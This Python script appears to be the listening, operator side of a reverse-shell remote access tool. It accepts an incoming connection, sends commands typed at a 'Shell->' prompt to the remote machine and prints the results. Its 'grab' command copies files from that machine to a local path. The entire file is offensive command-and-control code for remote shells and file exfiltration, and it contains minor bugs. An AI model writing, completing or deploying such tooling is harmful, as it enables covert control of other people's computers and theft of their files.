import socket
import os

def transfer(conn, command):
    conn.sendall(command)
    f = open('C:/Users/User_name/Desktop/test.png', 'wb') #Enter your username here.
    
    while True:
        bits = conn.recv(1024) 
        if b'Unable to find the file' in bits:
            print('Unable to find the file')
            break

        if bits.endswith(b'Done'):
            print("[+] Transfer Complete")
            f.close()
            break
        f.write(bits)

        
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('127.0.0.1', 8080))         #Enter host pc ip address.
    s.listen(1)
    conn, addr = s.accept()
    print("[+] We got a connection from:", addr)

    while True:
        command = input("Shell->")
        if 'terminate' in command:
            conn.sendall('terminate')
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn, command.encode())
        else:
            conn.sendall(command.encode('utf-8'))
            data = conn.recv(1024)
            data.decode()
            print(data)


def main():
    connect()

main()
